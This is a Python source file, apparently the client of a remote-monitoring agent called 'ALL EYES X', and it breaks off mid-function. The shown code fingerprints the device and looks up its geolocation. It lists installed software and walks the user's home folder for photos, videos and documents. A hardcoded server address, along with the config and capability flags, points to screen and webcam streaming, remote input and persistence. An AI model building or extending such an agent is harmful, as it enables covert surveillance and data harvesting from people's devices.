#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║          ALL EYES X — Neural Cyber Intelligence              ║
║              Cross-Platform Client Agent v3.3                ║
║                                                              ║
║  Platforms: Windows, Linux, macOS, Android (Termux)          ║
║  Deployment: Tailscale (http://100.104.145.118:5000)         ║
║                                                              ║
║  ENHANCEMENTS v3.3:                                          ║
║  - Full hardware inventory collection (OS, CPU, RAM, GPU,    ║
║    Storage, Network, Peripherals, Hardware info)             ║
║  - Submits detailed data to /api/device/<id>/hardware        ║
║  - WMI-based on Windows (dxdiag alternative, instant)        ║
║  - psutil for live usage stats (CPU%, RAM%)                 ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import uuid
import socket
import platform
import subprocess
import threading
import base64
import hashlib
import ipaddress
import shutil
import xml.etree.ElementTree as ET
import urllib.request
import urllib.error
import ssl
import re
import struct
import io
import contextlib
from xmlrpc import server
import zlib
import datetime
import subprocess
import requests
import socket, platform, time, uuid


def get_device_payload():
    hostname = socket.gethostname()
    device_id = hostname.lower().replace(" ", "-") + "-" + uuid.uuid4().hex[:6]
    # local IP fallback chain
    local_ip = "0.0.0.0"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        pass
    return {
        # dual field names — server accepts either spelling
        "device_id": device_id, "id": device_id,
        "hostname": hostname, "name": hostname, "device_name": hostname,
        "os": platform.system() + " " + platform.release(),
        "platform": platform.system(),
        "ip": local_ip, "ip_address": local_ip,
        "status": "online", "online": True,
        "last_seen": time.time(), "timestamp": time.time(),
        "heartbeat": True,
        "mac": "",
    }

def platform_kind():
    """Return a stable platform label used for capability decisions."""
    sysname = platform.system().lower()
    release = platform.release().lower()
    machine = platform.machine().lower()
    if 'android' in release or os.environ.get('ANDROID_ROOT') or os.environ.get('PREFIX', '').find('com.termux') >= 0:
        return 'android'
    if sysname == 'ios' or 'iphone' in machine or 'ipad' in machine:
        return 'ios'
    if sys.platform == 'win32':
        return 'windows'
    if sys.platform == 'darwin':
        return 'macos'
    if sys.platform.startswith('linux'):
        return 'linux'
    return sysname or 'unknown'


def capability_profile():
    """Declare what this agent can attempt on the current OS.

    iOS support is intentionally limited: regular iOS does not allow a Python
    process to run as a persistent background telemetry/remote-admin agent.
    The agent will still report basic identity when run inside a Python/iSH-like
    environment, but screenshots, webcam, remote input and persistence are not
    assumed available.
    """
    kind = platform_kind()
    return {
        'platform': kind,
        'telemetry': True,
        'hardware_inventory': kind in ('windows', 'linux', 'macos', 'android'),
        'screenshot': kind in ('windows', 'linux', 'macos'),
        'webcam': kind in ('windows', 'linux', 'macos', 'android'),
        'remote_input': kind in ('windows', 'linux', 'macos'),
        'persistence': kind in ('windows', 'linux', 'macos'),
        'nmap': kind in ('windows', 'linux', 'macos', 'android'),
        'limited_reason': 'iOS sandbox restrictions' if kind == 'ios' else '',
    }


def get_peripherals_info():
    """Return connected peripherals using the best available OS method."""
    devices = []
    kind = platform_kind()
    try:
        if kind == 'windows':
            output = subprocess.check_output(
                ['wmic', 'path', 'Win32_PnPEntity', 'get', 'Name'],
                universal_newlines=True, timeout=12, stderr=subprocess.DEVNULL
            )
            return [line.strip() for line in output.splitlines() if line.strip() and line.strip() != 'Name']
        if kind == 'linux':
            if shutil.which('lsusb'):
                output = subprocess.check_output(['lsusb'], text=True, timeout=8, stderr=subprocess.DEVNULL)
                devices.extend([line.strip() for line in output.splitlines() if line.strip()])
            by_id = '/dev/disk/by-id'
            if os.path.isdir(by_id):
                devices.extend([f'disk:{name}' for name in os.listdir(by_id)[:50]])
            return devices or ['Not reported']
        if kind == 'android':
            if shutil.which('termux-usb'):
                output = subprocess.check_output(['termux-usb', '-l'], text=True, timeout=8, stderr=subprocess.DEVNULL)
                return [line.strip() for line in output.splitlines() if line.strip()] or ['Not reported']
            return ['Not reported: install Termux:API for USB inventory']
        if kind == 'macos':
            output = subprocess.check_output(['system_profiler', 'SPUSBDataType', '-detailLevel', 'mini'], text=True, timeout=20, stderr=subprocess.DEVNULL)
            return [line.strip() for line in output.splitlines() if line.strip() and ':' in line][:100] or ['Not reported']
        if kind == 'ios':
            return ['Not reported: iOS sandbox does not expose peripheral inventory to normal Python apps']
    except Exception as e:
        return [f'Not reported: {e}']
    return ['Not reported']


# ============================================================
# CONFIGURATION
# ============================================================
SERVER_URL = "http://100.104.145.118:5000"
DEVICE_ID_CACHE = os.path.join(os.path.expanduser('~'), '.alleyesx_device_id')
# Defined at module level so the client stays importable (tests, Termux wrapper,
# embedding). __main__ overwrites it with generate_device_id().
DEVICE_ID = ""
HEARTBEAT_INTERVAL = 5
STREAM_PROFILE = os.environ.get('ALLEYESX_STREAM_PROFILE', 'balanced').lower()
STREAM_TARGET_FPS = {
    'low': 35,       # low-performance target range: 30-40 FPS
    'balanced': 50,  # upgraded default target: 50 FPS
    'high': 60,      # high-performance target: up to 60 FPS
}.get(STREAM_PROFILE, 50)
SCREENSHOT_INTERVAL = float(os.environ.get('ALLEYESX_SCREENSHOT_INTERVAL', str(1.0 / STREAM_TARGET_FPS)))
WEBCAM_INTERVAL = float(os.environ.get('ALLEYESX_WEBCAM_INTERVAL', str(1.0 / STREAM_TARGET_FPS)))
# 0.05s (20 req/s) overwhelmed the Windows socket stack and produced
# "ConnectionAbortedError [WinError 10053]" on the server. 0.5s is responsive
# for remote input and generates far fewer aborted sockets.
TOUCH_POLL_INTERVAL = float(os.environ.get('ALLEYESX_TOUCH_POLL_INTERVAL', '0.5'))
DIRTY_RECT_THRESHOLD = 0.005
SCREENSHOT_QUALITY = 70
WEBCAM_QUALITY = 65
MAX_DIRTY_PERCENT = 0.6
# Keep-alive full frame while the screen is static, so the stream never looks dead.
FULL_FRAME_KEEPALIVE = float(os.environ.get('ALLEYESX_FULL_FRAME_KEEPALIVE', '1.0'))
HARDWARE_REPORT_INTERVAL = 300  # Re-submit hardware every 5 minutes
# Software/file inventory walks the user profile, so it runs far less often.
SOFTWARE_REPORT_INTERVAL = float(os.environ.get('ALLEYESX_SOFTWARE_REPORT_INTERVAL', '600'))
SECURITY_TELEMETRY_INTERVAL = 30  # refresh security telemetry every 30s

# ============================================================
# SSL CONTEXT
# ============================================================
def create_ssl_context():
    ctx = ssl.create_default_context()
    return ctx

# ============================================================
# HARDWARE ID GENERATION
# ============================================================
def get_mac_address():
    try:
        mac_num = uuid.getnode()
        if mac_num and mac_num not in (0, 0xFFFFFFFFFFFF):
            mac = ':'.join(('%012x' % mac_num)[i:i+2] for i in range(0, 12, 2))
            if mac != '00:00:00:00:00:00':
                return mac
    except:
        pass
    try:
        import psutil
        for name, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if hasattr(addr, 'address') and addr.address:
                    mac = addr.address
                    if ':' in mac and mac != '00:00:00:00:00:00' and mac != 'ff:ff:ff:ff:ff:ff':
                        return mac
    except:
        pass
    try:
        for iface in os.listdir('/sys/class/net/'):
            if iface != 'lo':
                with open(f'/sys/class/net/{iface}/address') as f:
                    mac = f.read().strip()
                    if mac and mac != '00:00:00:00:00:00' and mac != 'ff:ff:ff:ff:ff:ff':
                        return mac
    except:
        pass
    try:
        if sys.platform in ('linux', 'darwin'):
            output = subprocess.check_output(['ip', 'link'], stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore')
            matches = re.findall(r'link/ether ([0-9a-f:]{17})', output)
            if matches:
                return matches[0]
    except:
        pass
    try:
        if sys.platform == 'win32':
            output = subprocess.check_output('getmac', shell=True, timeout=5).decode('utf-8', errors='ignore')
            match = re.search(r'([0-9A-Fa-f]{2}[-:]){5}[0-9A-Fa-f]{2}', output)
            if match:
                return match.group(0).replace('-', ':')
    except:
        pass
    return '00:00:00:00:00:00'


_disk_serial_cache = None

def get_disk_serial():
    global _disk_serial_cache
    if _disk_serial_cache:
        return _disk_serial_cache
    try:
        if sys.platform == 'win32':
            output = subprocess.check_output('wmic diskdrive get serialnumber', shell=True, timeout=10).decode()
            lines = [l.strip() for l in output.split('\n') if l.strip()]
            if len(lines) > 1:
                _disk_serial_cache = lines[1]
                return _disk_serial_cache
        elif sys.platform == 'linux':
            for disk in ['sda', 'nvme0', 'mmcblk0', 'vda', 'sdb']:
                for path in [f'/sys/block/{disk}/device/serial', f'/sys/block/{disk}/serial']:
                    try:
                        with open(path) as f:
                            serial = f.read().strip()
                            if serial:
                                _disk_serial_cache = serial
                                return _disk_serial_cache
                    except:
                        pass
        elif sys.platform == 'darwin':
            output = subprocess.check_output(['system_profiler', 'SPStorageDataType'], timeout=10).decode()
            match = re.search(r'Serial Number: (\S+)', output)
            if match:
                _disk_serial_cache = match.group(1)
                return _disk_serial_cache
    except:
        pass
    _disk_serial_cache = str(uuid.uuid4())
    return _disk_serial_cache


def generate_device_id():
    """Stable identity across restarts. Reuses the cached ID so the same
    machine never registers as a new device (kills duplicate rows)."""
    try:
        if os.path.exists(DEVICE_ID_CACHE):
            with open(DEVICE_ID_CACHE, 'r') as f:
                cached = f.read().strip()
                if len(cached) == 16 and all(c in '0123456789abcdef' for c in cached.lower()):
                    return cached
    except:
        pass

    mac = get_mac_address()
    serial = get_disk_serial()
    hostname = platform.node()
    raw = f"{mac}-{serial}-{hostname}"
    did = hashlib.sha256(raw.encode()).hexdigest()[:16]

    try:
        with open(DEVICE_ID_CACHE, 'w') as f:
            f.write(did)
    except:
        pass
    return did

# ============================================================
# SYSTEM INFORMATION COLLECTION
# ============================================================
def get_system_info():
    caps = capability_profile()
    info = {
        'device_id': DEVICE_ID,
        'hostname': platform.node() or socket.gethostname() or 'Unknown',
        'ip': get_local_ip(),
        'os': caps['platform'],
        'os_version': platform.platform(),
        'cpu': get_cpu_info(),
        'ram': get_ram_info(),
        'ram_total': get_ram_total_gb(),
        'architecture': platform.machine(),
        'mac': get_mac_address(),
        'public_ip': get_public_ip(),
        'country': 'Unknown',
        'city': 'Unknown',
        'latitude': 0.0,
        'longitude': 0.0,
        'capabilities': caps,
    }
    try:
        loc = get_geo_location()
        if loc:
            info.update(loc)
    except:
        pass
    return info


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'


def get_public_ip():
    services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ifconfig.me/ip', 'https://api.ip.sb/ip']
    for url in services:
        try:
            ctx = create_ssl_context()
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (compatible; ALLEYESX/3.3)'})
            with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
                ip = resp.read().decode().strip()
                if ip:
                    return ip
        except:
            continue
    return '0.0.0.0'


def get_geo_location():
    services = ['http://ip-api.com/json/', 'https://ipapi.co/json/']
    for url in services:
        try:
            ctx = create_ssl_context()
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
                data = json.loads(resp.read().decode())
                return {
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', data.get('region_name', 'Unknown')),
                    'latitude': data.get('lat', data.get('latitude', 0.0)),
                    'longitude': data.get('lon', data.get('longitude', 0.0))
                }
        except:
            continue
    return None


def get_cpu_info():
    try:
        if sys.platform == 'win32':
            output = subprocess.check_output('wmic cpu get name', shell=True, timeout=10).decode()
            lines = [l.strip() for l in output.split('\n') if l.strip()]
            return lines[1] if len(lines) > 1 else 'Unknown'
        elif sys.platform == 'linux':
            try:
                with open('/proc/cpuinfo') as f:
                    for line in f:
                        if 'model name' in line:
                            return line.split(':')[1].strip()
            except:
                pass
        elif sys.platform == 'darwin':
            output = subprocess.check_output(['sysctl', '-n', 'machdep.cpu.brand_string'], timeout=5).decode().strip()
            return output
    except:
        pass
    return 'Unknown'


def get_ram_info():
    total = get_ram_total_gb()
    if total:
        return f"{total:.1f} GB"
    try:
        import psutil
        mem = psutil.virtual_memory()
        return f"{mem.total / (1024**3):.1f} GB"
    except:
        pass
    return 'Unknown'


def get_ram_total_gb():
    try:
        if sys.platform == 'win32':
            output = subprocess.check_output('wmic memorychip get capacity', shell=True, timeout=10).decode()
            total_bytes = 0
            for line in output.split('\n')[1:]:
                line = line.strip()
                if line.isdigit():
                    total_bytes += int(line)
            if total_bytes:
                return total_bytes / (1024**3)
            output2 = subprocess.check_output('wmic computersystem get TotalPhysicalMemory', shell=True, timeout=10).decode()
            for line in output2.split('\n')[1:]:
                line = line.strip()
                if line.isdigit():
                    return int(line) / (1024**3)
        elif sys.platform == 'linux':
            with open('/proc/meminfo') as f:
                for line in f:
                    if 'MemTotal' in line:
                        kb = int(line.split()[1])
                        return kb / (1024 * 1024)
        elif sys.platform == 'darwin':
            output = subprocess.check_output(['sysctl', '-n', 'hw.memsize'], timeout=5).decode().strip()
            return int(output) / (1024**3)
    except:
        pass
    return 0


# ============================================================
# HARDWARE INVENTORY COLLECTION (v3.3.1 - Fixed)
# ============================================================

def collect_hardware_inventory():
    """Collect complete hardware inventory for device registration."""
    inventory = {
        'os': {
            'name': platform_kind(),
            'version': platform.platform(),
            'architecture': platform.machine(),
            'kernel_version': platform.version(),
            'boot_time': get_boot_time(),
        },
        'capabilities': capability_profile(),
        'processor': collect_processor_info(),
        'memory': collect_memory_info(),
        'graphics': collect_gpu_info(),
        'storage': collect_storage_info(),
        'network_interfaces': collect_network_info(),
        'peripherals': get_peripherals_info(),
        'hardware': collect_hardware_info(),
        'timestamp': datetime.datetime.utcnow().isoformat(),
    }
    return inventory


def collect_software_inventory():
    """Installed apps + user media/documents for the 'Read More' panel.

    Kept separate from the hardware inventory because it is slower (it walks the
    user profile), so it runs on its own, longer interval.
    """
    return {
        'installed_apps': collect_installed_apps(),
        'user_files': collect_user_files(),
        'timestamp': datetime.datetime.utcnow().isoformat(),
    }


# ============================================================
# SOFTWARE / FILE / MEDIA INVENTORY  ("Read More" panel)
#
# Deliberately bounded: every list is capped so a machine with 200k files
# cannot flood the server or blow up the SQLite row. Only the user's own
# profile is walked, and only well-known media extensions are matched.
# ============================================================
INVENTORY_MAX_APPS = 400
INVENTORY_MAX_FILES = 600
INVENTORY_MAX_DEPTH = 4
MEDIA_EXTS = {
    'video': {'.mp4', '.mkv', '.avi', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.mpg', '.mpeg'},
    'image': {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.tiff'},
    'audio': {'.mp3', '.wav', '.flac', '.aac', '.ogg', '.m4a', '.wma'},
    'document': {'.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.csv', '.odt'},
}


def _user_home():
    try:
        return os.path.expanduser('~')
    except Exception:
        return None


def collect_installed_apps():
    """Installed applications, using the native method per platform."""
    kind = platform_kind()
    apps = []
    try:
        if kind == 'windows':
            # Uninstall registry is the authoritative list; wmic product is slow
            # and misses most software.
            try:
                import winreg
                roots = [
                    (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'),
                    (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'),
                    (winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'),
                ]
                for hive, path in roots:
                    try:
                        with winreg.OpenKey(hive, path) as key:
                            i = 0
                            while True:
                                try:
                                    sub = winreg.EnumKey(key, i)
                                    i += 1
                                except OSError:
                                    break
                                try:
                                    with winreg.OpenKey(key, sub) as sk:
                                        name = winreg.QueryValueEx(sk, 'DisplayName')[0]
                                        try:
                                            version = winreg.QueryValueEx(sk, 'DisplayVersion')[0]
                                        except OSError:
                                            version = ''
                                        if name and not str(name).startswith('KB'):
                                            apps.append({'name': str(name), 'version': str(version)})
                                except OSError:
                                    continue
                    except OSError:
                        continue
            except ImportError:
                pass

        elif kind == 'macos':
            apps_dir = '/Applications'
            if os.path.isdir(apps_dir):
                for entry in sorted(os.listdir(apps_dir))[:INVENTORY_MAX_APPS]:
                    if entry.endswith('.app'):
                        apps.append({'name': entry[:-4], 'version': ''})

        elif kind in ('linux', 'android'):
            for cmd, parser in (
                (['dpkg-query', '-W', '-f=${Package}\t${Version}\n'], 'tab'),
                (['rpm', '-qa', '--qf', '%{NAME}\t%{VERSION}\n'], 'tab'),
                (['pacman', '-Q'], 'space'),
            ):
                if not shutil.which(cmd[0]):
                    continue
                try:
                    out = subprocess.check_output(cmd, text=True, timeout=25,
                                                  stderr=subprocess.DEVNULL)
                except Exception:
                    continue
                sep = '\t' if parser == 'tab' else ' '
                for line in out.splitlines()[:INVENTORY_MAX_APPS]:
                    line = line.strip()
                    if not line:
                        continue
                    parts = line.split(sep, 1)
                    apps.append({'name': parts[0], 'version': parts[1] if len(parts) > 1 else ''})
                break
    except Exception as e:
        return {'error': str(e), 'apps': []}

    # de-duplicate, keep it bounded
    seen = set()
    unique = []
    for a in apps:
        key = a['name'].lower()
        if key in seen:
            continue
        seen.add(key)
        unique.append(a)
        if len(unique) >= INVENTORY_MAX_APPS:
            break
    return {'apps': unique, 'count': len(unique)}


def collect_user_files():
    """Media and documents in the user's own profile, grouped by kind.

    Bounded by depth and count so this stays cheap on a modest machine.
    """
    home = _user_home()
    if not home or not os.path.isdir(home):
        return {'error': 'home directory unavailable', 'files': [], 'counts': {}}

    files = []
    counts = {k: 0 for k in MEDIA_EXTS}
    stack = [(home, 0)]
    scanned = 0

    while stack and len(files) < INVENTORY_MAX_FILES:
        current, depth = stack.pop()
        if depth > INVENTORY_MAX_DEPTH:
            continue
        try:
            entries = os.scandir(current)
        except (PermissionError, OSError):
            continue
        with entries:
            for entry in entries:
                if len(files) >= INVENTORY_MAX_FILES:
                    break
                try:
                    if entry.is_dir(follow_symlinks=False):
                        # skip hidden/noise dirs
                        name = entry.name.lower()
                        if name.startswith('.') or name in ('node_modules', 'appdata', 'venv'):
                            continue
                        stack.append((entry.path, depth + 1))
                    elif entry.is_file(follow_symlinks=False):
                        scanned += 1
                        ext = os.path.splitext(entry.name)[1].lower()
                        kind = next((k for k, exts in MEDIA_EXTS.items() if ext in exts), None)
                        if not kind:
                            continue
                        counts[kind] += 1
                        try:
                            size = entry.stat().st_size
                        except OSError:
                            size = 0
                        files.append({
                            'name': entry.name,
                            'path': entry.path,
                            'kind': kind,
                            'size': size,
                        })
                except OSError:
                    continue

    return {
        'files': files,
        'counts': counts,
        'scanned': scanned,
        'truncated': len(files) >= INVENTORY_MAX_FILES,
    }


def collect_processor_info():
    """Get detailed CPU info: model, cores, threads, clock speed, usage."""
    info = {
        'model': 'Unknown',
        'cores': 0,
        'threads': 0,
        'clock_speed_mhz': 0,
        'architecture': platform.machine(),
        'usage_percent': 0.0,
    }
    
    # Try psutil for live CPU percent and core counts
    try:
        import psutil
        info['usage_percent'] = round(psutil.cpu_percent(interval=0.5), 1)
        info['cores'] = psutil.cpu_count(logical=False) or 0
        info['threads'] = psutil.cpu_count(logical=True) or 0
    except:
        # Fallback to os
        info['cores'] = os.cpu_count() or 0
        info['threads'] = os.cpu_count() or 0
    
    try:
        if sys.platform == 'win32':
            # Use a single wmic query for all CPU details
            output = subprocess.check_output(
                'wmic cpu get name,numberofcores,numberoflogicalprocessors,maxclockspeed /format:csv',
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            
            lines = [l.strip() for l in output.split('\n') if l.strip()]
            for line in lines:
                if line.upper().startswith('NODE') or 'Name' in line.split(',')[-1] if ',' in line else False:
                    continue
                parts = line.split(',')
                if len(parts) >= 4:
                    # CSV format: Node,MaxClockSpeed,Name,NumberOfCores,NumberOfLogicalProcessors
                    # But order can vary — parse by header matching
                    info['model'] = parts[2].strip() if len(parts) > 2 else 'Unknown'
                    try:
                        info['clock_speed_mhz'] = int(float(parts[1])) if len(parts) > 1 else 0
                    except:
                        pass
                    try:
                        info['cores'] = int(parts[3]) if len(parts) > 3 else info['cores']
                    except:
                        pass
                    try:
                        info['threads'] = int(parts[4]) if len(parts) > 4 else info['threads']
                    except:
                        pass
                    break
            
            # If wmic didn't give cores/threads, keep psutil values (already set above)
            if info['model'] == 'Unknown' or not info['model']:
                # Try alternate query
                output2 = subprocess.check_output(
                    'wmic cpu get name /format:list',
                    shell=True, timeout=5, stderr=subprocess.DEVNULL
                ).decode('utf-8', errors='ignore')
                for line in output2.split('\n'):
                    if '=' in line:
                        key, val = line.split('=', 1)
                        if key.strip() == 'Name':
                            info['model'] = val.strip()
                            break
                        
        elif sys.platform == 'linux':
            try:
                with open('/proc/cpuinfo') as f:
                    data = f.read()
                # Model name
                match = re.search(r'model name\s+:\s+(.+)', data)
                if match:
                    info['model'] = match.group(1).strip()
                # Clock speed from /proc/cpuinfo
                match = re.search(r'cpu MHz\s+:\s+([\d.]+)', data)
                if match:
                    info['clock_speed_mhz'] = int(float(match.group(1)))
                # Cores from cpu cores line
                match = re.search(r'cpu cores\s+:\s+(\d+)', data)
                if match:
                    info['cores'] = int(match.group(1))
                siblings = re.search(r'siblings\s+:\s+(\d+)', data)
                if siblings:
                    info['threads'] = int(siblings.group(1))
            except:
                pass
                
        elif sys.platform == 'darwin':
            try:
                info['model'] = subprocess.check_output(
                    ['sysctl', '-n', 'machdep.cpu.brand_string'], timeout=5
                ).decode().strip()
                info['cores'] = int(subprocess.check_output(
                    ['sysctl', '-n', 'machdep.cpu.core_count'], timeout=5
                ).decode().strip())
                info['threads'] = int(subprocess.check_output(
                    ['sysctl', '-n', 'machdep.cpu.thread_count'], timeout=5
                ).decode().strip())
                mhz = subprocess.check_output(
                    ['sysctl', '-n', 'hw.cpufrequency'], timeout=5
                ).decode().strip()
                if mhz:
                    info['clock_speed_mhz'] = int(mhz) // 1000000
            except:
                pass
    except Exception as e:
        print(f"[-] CPU info error: {e}")
    
    # Ensure we always have fallback values
    if info['cores'] == 0:
        try:
            info['cores'] = os.cpu_count() or 1
        except:
            info['cores'] = 1
    if info['threads'] == 0:
        info['threads'] = info['cores']
    
    return info


def collect_memory_info():
    """Get detailed RAM info: total, used, free, speed, type, slots."""
    info = {
        'total_gb': 0.0,
        'used_gb': 0.0,
        'free_gb': 0.0,
        'usage_percent': 0.0,
        'speed_mhz': 0,
        'type': 'Unknown',
        'slots': [],
        'formatted': 'Unknown',
    }
    
    try:
        import psutil
        mem = psutil.virtual_memory()
        info['total_gb'] = round(mem.total / (1024**3), 1)
        info['used_gb'] = round(mem.used / (1024**3), 1)
        info['free_gb'] = round(mem.available / (1024**3), 1)
        info['usage_percent'] = round(mem.percent, 1)
        info['formatted'] = f"{info['total_gb']:.1f} GB"
    except:
        pass
    
    if sys.platform == 'win32':
        try:
            # Get individual memory module details
            output = subprocess.check_output(
                'wmic memorychip get capacity,speed,manufacturer,partnumber,memorytype /format:csv',
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            
            lines = [l.strip() for l in output.split('\n') if l.strip()]
            total_bytes = 0
            speeds = []
            
            for line in lines:
                if 'Capacity' in line or line.upper().startswith('NODE'):
                    continue
                parts = line.split(',')
                if len(parts) >= 2:
                    try:
                        capacity_bytes = int(parts[1]) if len(parts) > 1 else 0
                        total_bytes += capacity_bytes
                    except:
                        pass
                    try:
                        speed = int(parts[2]) if len(parts) > 2 else 0
                        if speed > 0:
                            speeds.append(speed)
                    except:
                        pass
                    
                    slot_info = {
                        'capacity_gb': round(capacity_bytes / (1024**3), 1) if capacity_bytes else 0,
                        'speed_mhz': int(parts[2]) if len(parts) > 2 and parts[2].strip().isdigit() else 0,
                        'manufacturer': parts[3].strip() if len(parts) > 3 else '',
                        'part_number': parts[4].strip() if len(parts) > 4 else '',
                    }
                    if slot_info['capacity_gb'] > 0:
                        info['slots'].append(slot_info)
            
            if total_bytes > 0 and info['total_gb'] == 0.0:
                info['total_gb'] = round(total_bytes / (1024**3), 1)
                info['formatted'] = f"{info['total_gb']:.1f} GB"
            
            if speeds:
                info['speed_mhz'] = max(speeds)
            
            # Memory type mapping
            mem_type = None
            try:
                output2 = subprocess.check_output(
                    'wmic memorychip get memorytype /format:csv',
                    shell=True, timeout=5, stderr=subprocess.DEVNULL
                ).decode('utf-8', errors='ignore')
                for line in output2.split('\n'):
                    parts = line.strip().split(',')
                    if len(parts) >= 2:
                        try:
                            mem_type = int(parts[-1])
                        except:
                            pass
                
                type_map = {
                    0: 'Unknown', 1: 'Other', 2: 'DRAM', 3: 'Synchronous DRAM',
                    4: 'Cache DRAM', 5: 'EDO', 6: 'EDRAM', 7: 'VRAM',
                    8: 'SRAM', 9: 'RAM', 10: 'ROM', 11: 'Flash',
                    12: 'EEPROM', 13: 'FEPROM', 14: 'EPROM', 15: 'CDRAM',
                    16: '3DRAM', 17: 'SDRAM', 18: 'DDR SGRAM', 19: 'DDR',
                    20: 'DDR2', 21: 'DDR2 FB-DIMM', 22: 'DDR3', 23: 'FBD2',
                    24: 'DDR4', 25: 'DDR5', 26: 'LPDDR', 27: 'LPDDR2',
                    28: 'LPDDR3', 29: 'LPDDR4', 30: 'LPDDR5'
                }
                info['type'] = type_map.get(mem_type, f'Type {mem_type}')
            except:
                pass
        except:
            pass
    
    elif sys.platform == 'linux':
        try:
            output = subprocess.check_output(
                ['dmidecode', '-t', 'memory'], timeout=10, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            
            speeds = re.findall(r'Speed:\s*(\d+)\s*MHz', output)
            if speeds:
                info['speed_mhz'] = max(int(s) for s in speeds)
            
            type_match = re.search(r'Type:\s*(.+)', output)
            if type_match:
                t = type_match.group(1).strip()
                if t and t != 'Unknown':
                    info['type'] = t
            
            capacities = re.findall(r'Size:\s*(\d+)\s*(MB|GB)', output)
            for cap, unit in capacities:
                gb = int(cap) / 1024 if unit == 'MB' else int(cap)
                info['slots'].append({'capacity_gb': gb})
                if info['total_gb'] == 0.0:
                    info['total_gb'] += gb
        except:
            pass
    
    elif sys.platform == 'darwin':
        try:
            output = subprocess.check_output(
                ['system_profiler', 'SPMemoryDataType'], timeout=10
            ).decode('utf-8', errors='ignore')
            match = re.search(r'Size:\s*(\d+)\s*(GB|MB)', output)
            if match:
                val = int(match.group(1))
                info['total_gb'] = val if match.group(2) == 'GB' else round(val / 1024, 1)
                info['formatted'] = f"{info['total_gb']:.1f} GB"
        except:
            pass
    
    # Final fallback
    if info['total_gb'] == 0.0 and info['formatted'] == 'Unknown':
        info['formatted'] = f"{info['total_gb']:.1f} GB"
    
    return info


def collect_gpu_info():
    """Get GPU details: name, VRAM, driver version, manufacturer."""
    gpus = []
    
    if sys.platform == 'win32':
        try:
            output = subprocess.check_output(
                'wmic path win32_videocontroller get name,adapterram,driverversion,adaptercompatibility /format:csv',
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            
            lines = [l.strip() for l in output.split('\n') if l.strip()]
            for line in lines:
                if 'Name' in line or line.upper().startswith('NODE'):
                    continue
                parts = line.split(',')
                if len(parts) >= 2:
                    name = parts[1].strip() if len(parts) > 1 else ''
                    if name and name != 'Name':
                        vram_bytes = 0
                        try:
                            vram_bytes = int(parts[2]) if len(parts) > 2 and parts[2].strip().isdigit() else 0
                        except:
                            pass
                        
                        gpu = {
                            'name': name[:120],
                            'vram_gb': round(vram_bytes / (1024**3), 1) if vram_bytes > 0 else 0,
                            'driver': parts[3].strip() if len(parts) > 3 else '',
                            'manufacturer': parts[4].strip() if len(parts) > 4 else '',
                        }
                        gpus.append(gpu)
        except:
            pass
        
        # Fallback to DxDiag if wmic returns nothing
        if not gpus:
            try:
                ps_script = '''
                $dx = Get-CimInstance -ClassName Win32_VideoController
                $dx | Select-Object Name, @{N="VRAM_MB";E={[math]::Round($_.AdapterRAM / 1MB)}}, DriverVersion, AdapterCompatibility | ConvertTo-Json
                '''
                output = subprocess.check_output(
                    ['powershell', '-NoProfile', '-Command', ps_script],
                    timeout=15, stderr=subprocess.DEVNULL
                ).decode('utf-8', errors='ignore')
                try:
                    data = json.loads(output)
                    if isinstance(data, dict):
                        data = [data]
                    for item in data:
                        gpus.append({
                            'name': item.get('Name', 'Unknown')[:120],
                            'vram_gb': round(item.get('VRAM_MB', 0) / 1024, 2),
                            'driver': item.get('DriverVersion', ''),
                            'manufacturer': item.get('AdapterCompatibility', ''),
                        })
                except:
                    pass
            except:
                pass
    
    elif sys.platform == 'linux':
        try:
            output = subprocess.check_output(
                ['lspci', '-nn'], timeout=5, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            for line in output.split('\n'):
                if 'VGA' in line or '3D' in line or 'Display' in line:
                    name = re.sub(r'\[\w+\]', '', line).split(':')[-1].strip()
                    gpus.append({
                        'name': name[:120],
                        'vram_gb': 0,
                        'driver': subprocess.check_output(
                            ['lsmod'], timeout=5, stderr=subprocess.DEVNULL
                        ).decode()[:200] if False else '',
                        'manufacturer': 'Unknown',
                    })
        except:
            pass
        
        # Try nvidia-smi for NVIDIA GPUs
        if not gpus:
            try:
                output = subprocess.check_output(
                    ['nvidia-smi', '--query-gpu=name,memory.total,driver_version', '--format=csv,noheader'],
                    timeout=10, stderr=subprocess.DEVNULL
                ).decode('utf-8', errors='ignore')
                for line in output.strip().split('\n'):
                    if line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 2:
                            vram_str = parts[1].replace(' MiB', '').replace(' GiB', '')
                            try:
                                vram_gb = round(int(vram_str) / 1024, 1) if 'MiB' in parts[1] else float(vram_str)
                            except:
                                vram_gb = 0
                            gpus.append({
                                'name': parts[0][:120],
